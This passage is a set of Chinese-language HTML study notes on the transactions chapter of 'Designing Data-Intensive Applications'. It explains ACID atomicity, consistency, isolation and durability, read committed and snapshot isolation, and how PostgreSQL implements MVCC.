<li>在多线程编程中，如果一个线程执行一个原子操作，这意味着另一个线程无法看到该操作的一半结果。系统只能处于操作之前或操作之后的状态，而不是介于两者之间的状态。</li>
</ul>
<p>ACID 的原子性并<strong>不</strong>是关于<strong>并发（concurrent）</strong>的，它的含义是：<strong>在多次写入过程中，如果发生错误、事务无法完成（提交）时，事务将被终止，且数据库会回滚该事务所有已经写入的变更</strong>。</p>
<ul>
<li>如果没有原子性，在多个写操作进行到一半时发生错误，很难知道哪些更改已经生效，哪些没有生效。贸然重试可能会导致数据重复或错误。</li>
<li>原子性简化了这个问题：<mark style="background: #BBFABBA6;">如果事务没有提交，应用程序可以确定它没有改变任何东西，所以可以安全地重试</mark>。</li>
</ul>
<p>ACID 原子性的定义特征是：<strong>能够在错误时中止事务，丢弃该事务进行的所有写入变更的能力。</strong>&nbsp; 或许 &nbsp;<strong>可中止性（abortability）</strong>&nbsp; 是更好的术语。</p>
<h4 id="一致性consistency"><strong>一致性（Consistency）</strong></h4>
<p>一致性有不同的含义，取决于场景和上下文：</p>
<ul>
<li>多副本：多个副本上的保存数据是否相同。第 5 章中，讨论的副本一致性，以及异步复制系统中的<strong>最终一致性</strong>问题。</li>
<li><strong>一致性哈希</strong>（Consistency Hash）：一种分区方法，用于解决普通哈希在重平衡时成本高的问题。</li>
<li>CAP 定理：一致性一词用于表示<strong>线性一致性</strong>。</li>
<li>ACID ：<strong>一致性</strong>是指数据库在应用程序的特定概念中处于 “良好状态”。</li>
</ul>
<p>在 ACID 中，一致性是对某些<strong>不变性（invariants）</strong>&nbsp; 的保证，即某些约束条件。如，在银行账户中，在任何时刻，账户余额须等于收入减去支出。</p>
<p>不同于 ACID 中其他性质，<mark style="background: #BBFABBA6;">一致性基本是由应用侧定义与维护的</mark>，依赖于数据库的安全保证，但不直接由数据库实现：</p>
<ol type="1">
<li>应用侧：定义一致性；写操作需要满足一致性约束</li>
<li>数据库：提供原子性、隔离性等能力，以及基础的外键约束等</li>
</ol>
<p>因此，一致性可以表述为，应用侧依赖数据库提供的原子性、隔离性来实现一致性。</p>
<ul>
<li>一致性并非数据库事务本身的一种特性，更多的是应用侧的一种属性。</li>
<li>据此，乔・海勒斯坦（Joe Hellerstein）认为，在 Härder 与 Reuter 的论文中，“ACID 中的 C” 是 “用来凑数的”。</li>
</ul>
<h4 id="隔离性isolation"><strong>隔离性（Isolation）</strong></h4>
<p>大多数数据库都会同时被多个客户端访问。如果多个客户端访问相同的数据库记录，则可能会遇到<strong>并发</strong>问题，也称<strong>竞争条件（race conditions）</strong>。</p>
<p><img src="ch07-fig01.png"></p>
<p><strong>图 7-1 两个客户端之间的竞争状态，同时递增计数器</strong></p>
<p>设有一个计数器，且数据库没有内置原子的自增操作，有两个用户，各自读取当前值，加 1 后写回。如图，期望计数器由 42 变为 44，但由于并发问题，最终变成了 43。</p>
<p>ACID 意义上的隔离性意味着，<mark style="background: #BBFABBA6;">同时执行的事务是相互隔离的：它们不会互相影响</mark>。</p>
<p>传统的数据库教科书将隔离性形式化为<strong>可串行化（Serializability）</strong>，这意味着每个事务可以假装它是唯一在整个数据库上运行的事务。数据库确保当事务已经提交时，结果与它们串行运行（一个接一个）是一样的，尽管实际上它们可能是并发运行的。</p>
<p>然而<mark style="background: #FFF3A3A6;">实践中很少会使用可串行化隔离，因为它有性能损失</mark>。一些流行的数据库如 Oracle 11g，甚至没有实现它。在 Oracle 中有一个名为 “可序列化” 的隔离级别，但实际上它实现了一种叫做<strong>快照隔离（snapshot isolation）</strong>&nbsp; 的功能，<strong>这是一种比可序列化更弱的保证</strong>【8,11】。</p>
<h4 id="持久性durability"><strong>持久性（Durability）</strong></h4>
<p>数据库系统的目的是，提供一个安全的地方存储数据，而不用担心丢失。<strong>持久性</strong>&nbsp; 是一个承诺：<mark style="background: #BBFABBA6;">一旦事务成功提交，写入的任何数据也不会丢失</mark>，即使发生硬件故障或数据库崩溃。</p>
<p>持久性可以有多重含义：</p>
<ul>
<li><mark style="background: #FFF3A3A6;">落盘</mark>：在单节点数据库中，持久性通常意味着数据已被写入非易失性存储设备，如硬盘或 SSD。
<ul>
<li>它通常还包括预写日志或类似的文件，以便在磁盘上的数据结构损坏时进行恢复。</li>
</ul></li>
<li><mark style="background: #FFF3A3A6;">复制</mark>：在多副本数据库中，持久性可能意味着数据已成功复制到一些节点。
<ul>
<li>为了保证持久性，数据库必须等到这些写入或复制完成后，才能报告事务成功提交。</li>
<li>也就是同步复制</li>
</ul></li>
</ul>
<p><strong>完美的持久性是不存在的</strong>&nbsp;：如果所有硬盘和所有备份同时被销毁，那显然没有任何数据库能救得了你。</p>
<p>写入硬盘和写入副本，两种对持久性的实现没有绝对的优劣：</p>
<ul>
<li>如果写入磁盘然后机器宕机，即使数据没有丢失，在修复机器或将磁盘转移到其他机器之前，也是无法访问的。这种情况下，复制系统可以保持可用性。</li>
<li>一个相关性故障（停电，或一个特定输入导致所有节点崩溃的 Bug）可能会一次性摧毁所有副本，任何仅存储在内存中的数据都会丢失，故内存数据库仍然要和磁盘写入打交道。</li>
<li>在异步复制系统中，当主库不可用时，最近的写入操作可能会丢失。</li>
<li>当电源突然断电时，特别是固态硬盘，有证据显示有时会违反应有的保证：甚至 fsync 也不能保证正常工作。硬盘固件可能有错误，就像任何其他类型的软件一样。</li>
<li>存储引擎和文件系统之间的微妙交互可能会导致难以追踪的错误，并可能导致磁盘上的文件在崩溃后被损坏。</li>
<li>磁盘上的数据可能会在没有检测到的情况下逐渐损坏。如果数据已损坏一段时间，副本和最近的备份也可能损坏。这种情况下，需要尝试从历史备份中恢复数据。</li>
<li>一项关于固态硬盘的研究发现，在运行的前四年中，30％到 80％的硬盘会产生至少一个坏块。相比固态硬盘，磁盘的坏道率较低，但完全失效的概率更高。</li>
<li>如果 SSD 断电，可能会在几周内开始丢失数据，具体取决于温度。</li>
</ul>
<p>在实践中，没有一种技术可以提供绝对保证，只有各种降低风险的技术，包括写入磁盘，复制到远程机器和备份 —— 它们可以且应该一起使用。与往常一样，<mark style="background: #FFF3A3A6;">最好抱着怀疑的态度接受任何理论上的 “保证”</mark>。</p>
<h4 id="原子性-vs-隔离性">原子性 vs 隔离性</h4>
<p>一个例子，用户 A 向 B 发送一封新邮件，需要更新两个对象：</p>
<ul>
<li>用户 B 的收件箱新增一封邮件</li>
<li>用户 B 的全局未读数 + 1</li>
</ul>
<p>这两个变更在一个事务中。与此同时，用户 B 读取了未读数和收件箱。那么：</p>
<ul>
<li>隔离性：用户 B 要么同时看到未读数和收件箱更新；要么都看不到
<ul>
<li>重点：<mark style="background: #BBFABBA6;">事务的中间状态不可能被其他事务读到</mark></li>
</ul></li>
<li>原子性：如果未读数更新失败，新增的邮件也会被撤销
<ul>
<li>重点：<mark style="background: #BBFABBA6;">事务的中间状态不可能出现在磁盘上</mark></li>
</ul></li>
</ul>
<p>这么一对比就很清晰了。</p>
<h3 id="单对象和多对象操作"><strong>单对象和多对象操作</strong></h3>
<p>如果想同时修改多个对象（行，文档，记录）。通常需要 &nbsp;<strong>多对象事务（multi-object transaction）</strong>&nbsp; 来保证数据同步。</p>
<p>多对象事务中，如何确定多个操作是否属于同一事务：</p>
<ol type="1">
<li>通过 TCP 连接来确定，在同一个连接中，<code>BEGIN TRANSACTION</code>&nbsp; 和 &nbsp;<code>COMMIT</code> 语句之间的所有内容，可以认为属于同一个事务。
<ol type="1">
<li>无法处理的情况：如在客户端提交事务请求后，服务器回应提交之前，网络中断，连接断开，此时客户端则无从得知事务是否被成功提交。</li>
</ol></li>
<li>使用事务管理器，为每个事务分配一个<mark style="background: #BBFABBA6;">唯一标识符</mark>，从而对操作进行分组。</li>
</ol>
<p>实际中基本上使用第二种方法。</p>
<p>有一些非关系型数据库，<mark style="background: #FFF3A3A6;">虽然提供 Batch 操作接口，但它们并不一定有事务语义</mark>，即可能有些对象成功，另外一些对象操作却失败。</p>
<ul>
<li>例如 redis 的 mset</li>
</ul>
<h4 id="单对象写入"><strong>单对象写入</strong></h4>
<p>当只更改单个对象时，仍会面临原子性和隔离性的问题。假设，在文档数据库中，你正在写入一个 20 KB 的 JSON 文档：</p>
<ol type="1">
<li>如果发送了前 10 kb 数据后，网络断开，数据库是否已经存储了这不完整的 10k 数据？</li>
<li>如果该操作是正在覆盖一个老版本同 id 数据，覆盖一半时电源发生故障，数据库是否会存在一半旧值一半新值？</li>
<li>如果有另一个客户端同时在读取该文档，是否会看到半更新状态？</li>
</ol>
<p>这些问题都非常棘手，如果数据库不提供任何保证，用户侧得写很多的错误处理逻辑。因此，<mark style="background: #BBFABBA6;">一般的数据库哪怕不支持完整的事务，也会提供针对单个对象的原子性和隔离性</mark>。比如：</p>
<ul>
<li>原子性：可以使用 WAL 来保证</li>
<li>隔离性：使用锁来保证</li>
</ul>
<p>其他一些数据库，也会提供更复杂的原子支持，如原子的自增操作，从而避免图 7-1 中的交错更新。另一种更泛化的原子性保证是提供单个对象上的 CAS（compare and set） 操作，允许用户原子的执行针对单个对象的 read-modify-write 操作。</p>
<ul>
<li>如果咬文嚼字一下，<strong>原子自增</strong>（atomic increment），在 ACID 中应该是属于隔离性（Isolation）的范畴，此处的原子自增其实是多线程的概念。但这有点吹毛求疵了。</li>
</ul>
<p>有的 NoSQL 数据库将上述支持宣传为 “轻量级事务”，甚而营销为 “ACID”。但这是极其不负责任的，通常来说，事务是一种将针对<strong>多个对象</strong>的<strong>多个操作</strong>封装为一个执行单元的机制。</p>
<h3 id="多对象事务的需求"><strong>多对象事务的需求</strong></h3>
<p>许多分布式数据存储已经放弃了多对象事务，因为<mark style="background: #FFF3A3A6;">多对象事务很难跨分区实现</mark>，而且在需要高可用性或高性能的情况下，它们可能会碍事。但说到底，在分布式数据库中实现事务，并没有什么根本性的障碍。第九章 将讨论分布式事务的实现。</p>
<p>但是我们是否需要多对象事务？<strong>是否有可能只用键值数据模型和单对象操作来实现任何应用程序？</strong></p>
<p>有一些场景中，单对象插入，更新和删除是足够的。但是许多其他场景需要协调写入几个不同的对象：</p>
<ul>
<li>在关系数据模型中，一个表中的行通常具有对另一个表中的行的<mark style="background: #FFF3A3A6;">外键引用</mark>。多对象事务可以确保这些引用始终有效：当插入几个相互引用的记录时，外键必须是正确的和最新的，不然数据就没有意义。</li>
<li>在文档数据模型中，需要一起更新的字段通常在同一个文档中，这被视为单个对象 —— 更新单个文档时不需要多对象事务。但是，没有 join 功能的文档数据库会鼓励非规范化。当<mark style="background: #FFF3A3A6;">需要更新非规范化的信息时，需要一次更新多个文档</mark>。事务在这种情况下非常有用，可以防止非规范化的数据不同步。</li>
<li>在具有<mark style="background: #FFF3A3A6;">二级索引</mark>的数据库中（除了纯粹的键值存储以外几乎都有），<mark style="background: #FFF3A3A6;">每次更改值时都需要更新索引</mark>。从事务角度来看，这些索引是不同的数据库对象：例如，如果没有事务隔离性，记录可能出现在一个索引中，但没有出现在另一个索引中，因为第二个索引的更新还没有发生。</li>
</ul>
<p>这些应用仍然可以在没有事务的情况下实现。然而：</p>
<ul>
<li><mark style="background: #FFF3A3A6;">没有原子性，错误处理就要复杂得多</mark></li>
<li><mark style="background: #FFF3A3A6;">缺乏隔离性，就会导致并发问题</mark></li>
</ul>
<h4 id="处理错误和中止"><strong>处理错误和中止</strong></h4>
<p>事务的一个关键特性是，<mark style="background: #BBFABBA6;">如果发生错误，它可以中止并安全地重试</mark>。 ACID 数据库基于这样的哲学：如果数据库有违反其原子性，隔离性或持久性的危险，则宁愿完全放弃事务，而不是留下半成品。</p>
<p>并不是所有的系统都遵循这个哲学。特别是具有 &nbsp; 无主复制 的数据存储，主要是在 “尽力而为” 的基础上进行工作。可以概括为 “<mark style="background: #FFF3A3A6;">数据库将做尽可能多的事，运行遇到错误时，它不会撤消它已经完成的事情</mark> “ —— 所以，从错误中恢复是应用程序的责任。</p>
<p>错误发生不可避免，但许多软件开发人员倾向于只考虑乐观情况，而不是错误处理的复杂性。例如，像 Rails 的 ActiveRecord 和 Django 这样的 &nbsp;<strong>对象关系映射（ORM, object-relation Mapping）</strong>&nbsp; 框架不会重试中断的事务 —— 这个错误通常会导致一个从堆栈向上传播的异常，所以任何用户输入都会被丢弃，用户拿到一个错误信息。<mark style="background: #BBFABBA6;">这实在是太耻辱了，因为中止的重点就是允许安全重试</mark>。</p>
<p>尽管重试一个中止的事务是一个简单而有效的错误处理机制，但它并不完美：</p>
<ul>
<li><mark style="background: #FFF3A3A6;">回复丢包导致的重试</mark>：如果事务实际上成功了，但是在服务器试图向客户端确认提交成功时网络发生故障（所以客户端认为提交失败了），那么重试事务会导致事务被执行两次 —— <mark style="background: #FFF3A3A6;">除非你有一个额外的应用级去重机制</mark>。</li>
<li><mark style="background: #FFF3A3A6;">如果错误是由于负载过大造成的，则重试事务将使问题变得更糟</mark>。为了避免这种正反馈循环，可以限制重试次数，使用指数退避算法，并单独处理与过载相关的错误（如果允许）。</li>
<li>仅在<mark style="background: #FFF3A3A6;">临时性错误</mark>（例如，由于死锁，异常情况，临时性网络中断和故障切换）后才值得重试。在发生永久性错误（例如，违反约束）之后重试是毫无意义的。</li>
<li>如果事务在数据库之外也有副作用，即使事务被中止，也可能发生这些副作用。例如，如果你正在发送电子邮件，那你肯定不希望每次重试事务时都重新发送电子邮件。如果你想确保几个不同的系统一起提交或放弃，<mark style="background: #BBFABBA6;">两阶段提交（2PC, two-phase commit）</mark>&nbsp; 可以提供帮助。</li>
<li>如果客户端进程在重试中失效，任何试图写入数据库的数据都将丢失。</li>
</ul>
<h2 id="弱隔离级别"><strong>弱隔离级别</strong></h2>
<p>当<mark style="background: #FFF3A3A6;">事务读取由另一事务同时修改的数据时，或者当两个事务试图同时修改相同的数据</mark>时，并发问题（竞争条件）才会出现。</p>
<ul>
<li>并发 BUG 很难通过测试找到，因为这样的错误只有在特殊时机下才会触发</li>
</ul>
<p><mark style="background: #BBFABBA6;">数据库通过提供事务隔离（transaction isolation）来隐藏应用程序的并发问题</mark>。从理论上讲，隔离性可以隐藏并发事实：</p>
<ul>
<li><strong>可串行化（serializable）</strong>&nbsp; 的隔离等级意味着数据库保证事务的效果与串行运行（没有任何并发）是一样的</li>
</ul>
<p>可串行化属于强隔离级别，有性能损失，许多数据库不愿意支付这个代价。因此，系统通常使用较弱的隔离级别来防止一部分，而不是全部的并发问题。</p>
<ul>
<li><mark style="background: #FFF3A3A6;">弱隔离级别通常难以理解，并且会导致微妙的错误</mark>，但是它们仍然在实践中被使用。</li>
</ul>
<p>本节介绍常用的弱隔离级别，讨论它们可解决和无法处理的并发问题。</p>
<h3 id="读已提交"><strong>读已提交</strong></h3>
<p>最基本的事务隔离级别是<strong>读已提交（Read Committed）</strong>，它提供了两个保证：</p>
<ol type="1">
<li>没有<strong>脏读（dirty reads）</strong>：从数据库读时，<mark style="background: #BBFABBA6;">只能看到已提交的数据</mark></li>
<li>没有<strong>脏写（dirty writes）</strong>：写入数据库时，<mark style="background: #BBFABBA6;">只会覆盖已提交的数据</mark></li>
</ol>
<p>某些数据库支持甚至更弱的隔离级别，称为 &nbsp;<strong>读未提交（Read uncommitted）</strong>。它可以防止脏写，但不防止脏读。</p>
<h4 id="没有脏读"><strong>没有脏读</strong></h4>
<p>如果事务 A 能够读到另一未提交事务 B 的中间状态，称为<strong>脏读</strong>（dirty reads）。</p>
<p><img src="ch07-fig04.png"></p>
<p><strong>图 7-4 没有脏读：用户 2 只有在用户 1 的事务已经提交后才能看到 x 的新值。</strong></p>
<p>在<strong>读已提交</strong>隔离级别运行的事务必须防止脏读。这意味着：<mark style="background: #BBFABBA6;">事务的所有写入操作只有在该事务提交时才能被其他事务看到</mark>。</p>
<p>为什么要防止脏读，有几个原因：</p>
<ul>
<li>如果事务需要更新多个对象脏读取意味着另一个事务可能会只看到一部分更新。这种<mark style="background: #FFF3A3A6;">中间状态可能是不一致的</mark>，例如银行转账场景，先减钱再加钱。</li>
<li>如果事务中止，则所有写入操作都需要回滚。如果数据库允许脏读，那就意味着一个<mark style="background: #FFF3A3A6;">事务可能会读到稍后需要回滚的数据</mark>，即从未实际提交给数据库的数据。</li>
</ul>
<h4 id="没有脏写"><strong>没有脏写</strong></h4>
<p>如果两个事务同时尝试更新数据库中的相同对象，会发生什么情况？我们不知道写入的顺序是怎样的，但是我们<mark style="background: #FFF3A3A6;">通常认为后面的写入会覆盖前面的写入</mark>。</p>
<p><strong>脏写（dirty write）</strong>：事务 B 覆盖另一未提交事务 A 的写入。</p>
<p>在<strong>读已提交</strong>的隔离级别上运行的事务必须防止脏写，通常是延迟第二次写入，直到第一次写入事务提交或中止为止。</p>
<p>通过防止脏写，这个隔离级别避免了一些并发问题：</p>
<ul>
<li>如果事务更新多个对象，脏写会导致不好的结果。例如图 7-5 的二手车销售网站，Alice 和 Bob 两个人同时试图购买同一辆车。购买汽车需要两次数据库写入：更新商品列表，将销售发票发送给买家。在图 7-5 的情况下，Bob 成功更新了商品列表，但 Alice 成功更新了发票表。读已提交会阻止这样这样的事故。</li>
<li>但是，<mark style="background: #FFF3A3A6;">读已提交并不能解决写丢失问题</mark>，防止图 7-1 中两个计数器增量之间的竞争状态。在这种情况下，第二次写入发生在第一个事务提交后，所以它不是一个脏写。这仍然是不正确的，但是出于不同的原因，在 “<a href="https://vonng.gitbooks.io/ddia-cn/content/ch7.html#%E9%98%B2%E6%AD%A2%E4%B8%A2%E5%A4%B1%E6%9B%B4%E6%96%B0">防止更新丢失</a>” 中将讨论如何使这种计数器增量安全。</li>
</ul>
<p><img src="ch07-fig05.png"></p>
<p><strong>图 7-5 如果存在脏写，<mark style="background: #FFF3A3A6;">来自不同事务的冲突写入可能会混淆在一起</mark></strong></p>
<h4 id="实现读已提交"><strong>实现读已提交</strong></h4>
<p><strong>读已提交</strong>是一个非常流行的隔离级别。这是 Oracle 11g，PostgreSQL，SQL Server 2012，MemSQL 和其他许多数据库的默认设置【8】。</p>
<p><strong>防止脏写</strong></p>
<p>使用<strong>行锁（row-level lock）</strong>：当事务想要修改特定对象（行或文档）时，它<mark style="background: #BBFABBA6;">必须首先获得该对象的锁，持有该锁直到事务被提交或中止</mark>。</p>
<ul>
<li>互斥：同时只有一个事务可持有任何给定对象的锁</li>
<li>阻塞：如果另一个事务要写入同一个对象，则<mark style="background: #FFF3A3A6;">必须等到第一个事务提交或中止后</mark>，才能获取该锁并继续</li>
<li>这种锁定是读已提交模式（或更强的隔离级别）的数据库自动完成的</li>
</ul>
<p><strong>防止脏读</strong></p>
<p>一种选择是使用相同的锁，并要求任何想要读取对象的事务来简单地获取该锁，然后在读取之后立即再次释放该锁。这能确保不会读取进行时，对象不会在脏的状态，有未提交的值（因为在那段时间锁会被写入该对象的事务持有）。</p>
<p>但是要求读锁的办法在实践中效果并不好。因为一个长时间运行的写入事务会迫使许多只读事务等到这个慢写入事务完成。这会损失只读事务的响应时间，并且不利于可操作性：因为等待锁，应用某个部分的迟缓可能由于连锁效应，导致其他部分出现问题。</p>
<p>出于这个原因，大多数数据库使用图 7-4 的方式防止脏读：</p>
<ul>
<li>对于写入的每个对象，数据库都会<mark style="background: #BBFABBA6;">记住旧的已提交值，和由当前持有写入锁的事务设置的新值</mark>。</li>
<li>当<mark style="background: #FFF3A3A6;">事务正在进行时，任何其他读取对象的事务都会拿到旧值</mark>。 只有当新值提交后，事务才会切换到读取新值。</li>
</ul>
<h3 id="快照隔离和可重复读"><strong>快照隔离和可重复读</strong></h3>
<p>读已提交隔离级别提供的保证：</p>
<ul>
<li>原子性：允许<strong>中止</strong></li>
<li>防止脏读：避免读取不完整的事务结果</li>
<li>防止脏写：避免并发写入造成的混乱</li>
</ul>
<p>但是，它<mark style="background: #FFF3A3A6;">不能保证一个事务中的多次读取，读到的结果总是一致的</mark>。一个例子如下：</p>
<p>Alice 在银行有 1000 美元的储蓄，分为两个账户，每个 500 美元。现在有一笔事务从她的一个账户转移了 100 美元到另一个账户。如果她非常不幸地在事务处理的过程中查看其账户余额列表，她可能会：</p>
<ul>
<li>在收到付款之前先看到账户 1 的余额（收款账户，余额仍为 500 美元）</li>
<li>在发出转账之后再看到账户 2 的余额（付款账户，新余额为 400 美元）</li>
</ul>
<p>对 Alice 来说，现在她的账户似乎总共只有 900 美元 —— 看起来有 100 美元已经凭空消失了。</p>
<p><img src="ch07-fig06.png"></p>
<p><strong>图 7-6 读取偏差：Alice 观察数据库处于不一致的状态</strong></p>
<p>这种异常被称为 &nbsp;<strong>不可重复读（nonrepeatable read）</strong>&nbsp; 或 &nbsp;<strong>读取偏差（read skew）</strong>。如果 Alice 在事务结束时再次读取账户 1 的余额，她将看到与之前的查询中看到的不同的值（600 美元）。在读已提交的隔离条件下，<strong>不可重复读</strong>&nbsp; 被认为是可接受的：Alice 看到的帐户余额确实在读时已经提交了。</p>
<p><mark style="background: #FFF3A3A6;">个人理解：不可重复读问题可以理解为脏读的泛化</mark></p>
<ul>
<li>脏读是事务中的单次读读到了不一致数据</li>
<li>不可重复读是同一事务中的多次读取，不属于同一个版本，导致不一致</li>
</ul>
<blockquote>
<p>不幸的是，术语 偏差（skew）&nbsp; 这个词是过载的：</p>
<ul>
<li>分片场景：skew 描述分片热点的工作量不平衡</li>
<li>事务场景：skew 意味着时序异常</li>
</ul>
</blockquote>
<p>对于 Alice 的情况，这不是一个长期持续的问题。因为如果她几秒钟后刷新银行网站的页面，她很可能会看到一致的帐户余额。但是有些情况下，不能容忍这种暂时的不一致：</p>
<ul>
<li>备份 进行备份需要复制整个数据库，对大型数据库而言可能需要花费数小时才能完成。备份进程运行时，数据库仍然会接受写入操作。因此备份可能会包含一些旧的部分和一些新的部分。<mark style="background: #FFF3A3A6;">如果从这样的备份中恢复，不一致就会变成永久的</mark>。</li>
<li>分析查询和完整性检查 有时，你可能需要运行一个查询，扫描大部分的数据库。这样的查询在分析中很常见，也可能是定期完整性检查（即监视数据损坏）的一部分。<mark style="background: #FFF3A3A6;">如果这些查询在不同时间点观察数据库的不同部分，则可能会返回毫无意义的结果</mark>。</li>
</ul>
<p><strong>快照隔离（snapshot isolation）</strong>是这个问题最常见的解决方案。想法是，每个事务都从数据库的 &nbsp;<strong>一致快照（consistent snapshot）</strong>&nbsp; 中读取。</p>
<ul>
<li>事务可以看到事务开始时在数据库中提交的所有数据</li>
<li>即使这些数据随后被另一事务更改，每个事务<mark style="background: #BBFABBA6;">也只能看到特定时间点的旧数据</mark></li>
</ul>
<p><mark style="background: #BBFABBA6;">快照隔离对长时间运行的只读查询（如备份和分析）非常有用</mark>。如果查询的数据在查询执行的同时发生变化，则很难理解查询的含义。当一个事务可以看到数据库在某个特定时间点冻结时的一致快照，理解起来就很容易了。</p>
<p>快照隔离是一个流行的功能：PostgreSQL、使用 InnoDB 引擎的 MySQL、Oracle、SQL Server 等都支持。</p>
<h4 id="实现快照隔离"><strong>实现快照隔离</strong></h4>
<p>与读取提交的隔离类似，快照隔离的实现通常使用写锁来防止脏写，这意味着进行写入的事务会阻止另一个事务修改同一个对象。但是读取不需要任何锁定。</p>
<p>从性能的角度来看，<mark style="background: #BBFABBA6;">快照隔离的一个关键原则是：读不阻塞写，写不阻塞读</mark>。这允许数据库在处理一致性快照上的长时间查询时，可以正常地同时处理写入操作。且两者间没有任何锁定争用。</p>
<p>为了实现快照隔离，数据库使用了用于防止图 7-4 中的脏读的机制的一般化。数据库必须可能保留一个对象的几个不同的提交版本，因为各种正在进行的事务可能需要看到数据库在不同的时间点的状态。因为它同时维护着多个版本的对象，所以这种技术被称为<mark style="background: #BBFABBA6;">多版本并发控制（MVCC, multi-version concurrentcy control）</mark>。</p>
<p>支持快照隔离的存储引擎通常也使用 MVCC 来实现<strong>读已提交</strong>隔离级别。一种典型的方法是：</p>
<ul>
<li><strong>读已提交</strong>：<mark style="background: #FFF3A3A6;">每个查询使用单独的快照</mark></li>
<li><strong>快照隔离</strong>：<mark style="background: #BBFABBA6;">整个事务使用相同的快照</mark></li>
</ul>
<p>图 7-7 说明了如何在 PostgreSQL 中实现基于 MVCC 的快照隔离（其他实现类似）。当一个事务开始时，它被赋予一个唯一的，永远增长的事务 ID（<code>txid</code>）。每当事务向数据库写入任何内容时，它所写入的数据都会被标记上写入者的事务 ID。</p>
<blockquote>
<p>事实上，事务 ID 是 32 位整数，所以大约会在 40 亿次事务之后溢出。 PostgreSQL 的 Vacuum 过程会清理老旧的事务 ID，确保事务 ID 溢出（回卷）不会影响到数据。</p>
</blockquote>
<p><img src="ch07-fig07.png"></p>
<p><strong>图 7-7 MVCC 实现快照隔离</strong></p>
<p>表中每一行中<mark style="background: #BBFABBA6;">使用额外字段存储修改该行的事务 ID</mark> ：</p>
<ul>
<li><code>created_by</code>&nbsp;：将该行插入到表中的的事务 ID</li>
<li><code>deleted_by</code>&nbsp;：将该行从表中删除的事务 ID
<ul>
<li>最初是空的。如果某个事务删除了一行，那么该行实际上并未从数据库中删除，而是通过将 &nbsp;<code>deleted_by</code>&nbsp; 字段设置为<mark style="background: #FFF3A3A6;">请求删除的事务的 ID 来标记为删除</mark>。</li>
<li>之后，当确定没有事务可以再访问已删除的数据时，数据库中的垃圾收集过程会将所有带有删除标记的行移除，并释放其空间。</li>
</ul></li>
</ul>
<blockquote>
<p>在 PostgreSQL 中：</p>
<ul>
<li>created_by 的实际名称为 xmin，即能读到改行的最小 txid</li>
<li>deleted_by 的实际名称为 xmax，即能读到改行的最大 txid</li>
</ul>
</blockquote>
<p><code>UPDATE</code>&nbsp; 操作在内部翻译为 &nbsp;<code>DELETE</code>&nbsp; 和 &nbsp;<code>INSERT</code>&nbsp;。例如，在图 7-7 中，事务 13 从账户 2 中扣除 100 美元，将余额从 500 美元改为 400 美元。实际上包含两条账户 2 的记录：</p>
<ul>
<li>余额为 $500 的行被标记为<strong>被事务 13 删除</strong></li>
<li>余额为 $400 的行<strong>由事务 13 创建</strong></li>
</ul>
<h4 id="观察一致性快照的可见性规则"><strong>观察一致性快照的可见性规则</strong></h4>
<p>当一个事务从数据库中读取时，<mark style="background: #BBFABBA6;">事务 ID 用于决定它可以看见哪些对象，看不见哪些对象</mark>。通过仔细定义可见性规则，数据库可以向应用程序呈现<strong>一致的数据库快照</strong>。原理如下：</p>
<ul>
<li><mark style="background: #FFF3A3A6;">进行中的事务的操作不可见</mark>：在每次事务开始时，数据库列出当时所有其他尚未提交或中止的事务清单，即使之后提交了，这些事务的写入也都会被忽略</li>
<li><mark style="background: #FFF3A3A6;">中止事务所执行的任何写入都将被忽略</mark></li>
<li><mark style="background: #FFF3A3A6;">新事务的操作不可见</mark>：由具有较大的事务 ID（即，在当前事务开始之后开始的）的事务所做的任何写入都被忽略，而不管这些事务是否已经提交</li>
<li>所有其他写入，对应用都是可见的</li>
</ul>
<p>这些规则适用于创建和删除对象。可以理解为，“快照” 就包含了进行中的事务 ID。</p>
<p>如果事务 txid 是严格自增的，则可以理解为，对于 txid = x 的事务来说：</p>
<ol type="1">
<li>对于所有 txid &lt; x 的事务，<mark style="background: #FFF3A3A6;">如果已经中止或正在进行，则其所写数据不可见</mark></li>
<li>对于所有 txid &gt; x 的事务，所写数据皆不可见</li>
</ol>
<p>换句话说，如果以下两个条件都成立，则对象的版本可见：</p>
<ul>
<li>读事务开始时，创建该对象的事务<mark style="background: #BBFABBA6;">已经提交</mark></li>
<li>对象<mark style="background: #BBFABBA6;">未被标记为删除</mark>，或如果被标记为删除，请求删除的事务在读事务开始时尚未提交</li>
</ul>
<p>长时间运行的事务可能会长时间使用快照，并继续读取（从其他事务的角度来看）早已被覆盖或删除的值。由于从来不更新值，而是每次值改变时创建一个新的版本，数据库可以在<mark style="background: #BBFABBA6;">提供一致快照的同时只产生很小的额外开销</mark>。</p>
<h4 id="索引和快照隔离"><strong>索引和快照隔离</strong></h4>
<p>索引如何在多版本数据库中工作？一种选择是使索引简单地指向对象的所有版本，并且需要索引查询来过滤掉当前事务不可见的任何对象版本。当垃圾收集删除任何事务不再可见的旧对象版本时，相应的索引条目也可以被删除。</p>
<p>在实践中，许多实现细节决定了多版本并发控制的性能。例如，如果同一对象的不同版本可以放入同一个页面中，PostgreSQL 的优化可以避免更新索引【31】。</p>
<p>在 CouchDB，Datomic 和 LMDB 中使用另一种方法。虽然它们也使用 B 树，但它们使用的是一种<strong>仅追加 / 写时拷贝（append-only/copy-on-write）</strong>&nbsp; 的变体，它们在更新时不覆盖树的页面，而为每个修改页面创建一份副本。从父页面直到树根都会级联更新，以指向它们子页面的新版本。任何不受写入影响的页面都不需要被复制，并且保持不变【33,34,35】。</p>
<p>使用仅追加的 B 树，每个写入事务（或一批事务）都会创建一颗新的 B 树，当创建时，从该特定树根生长的树就是数据库的一个一致性快照。没必要根据事务 ID 过滤掉对象，因为后续写入不能修改现有的 B 树；它们只能创建新的树根。但这种方法也需要一个负责压缩和垃圾收集的后台进程。</p>
<h4 id="可重复读与命名混淆"><strong>可重复读与命名混淆</strong></h4>
<p>快照隔离是一个有用的隔离级别，特别对于只读事务而言。但是，许多数据库实现了它，却用不同的名字来称呼。</p>
<ul>
<li>在 Oracle 中称为<strong>可序列化（Serializable）</strong></li>
<li>在 PostgreSQL 和 MySQL 中称为 ** 可重复读（repeatable read）</li>
</ul>
<p>这种命名混淆的原因是<mark style="background: #FFF3A3A6;"> SQL 标准没有快照隔离的概念</mark>，因为标准是基于 System R 1975 年定义的隔离级别，那时候<strong>快照隔离</strong>尚未发明。相反，它定义了<strong>可重复读</strong>，表面上看起来与快照隔离很相似。 PostgreSQL 和 MySQL 称其<strong>快照隔离</strong>级别为<strong>可重复读（repeatable read）</strong>，因为这样符合标准要求，所以它们可以声称自己 “标准兼容”。</p>
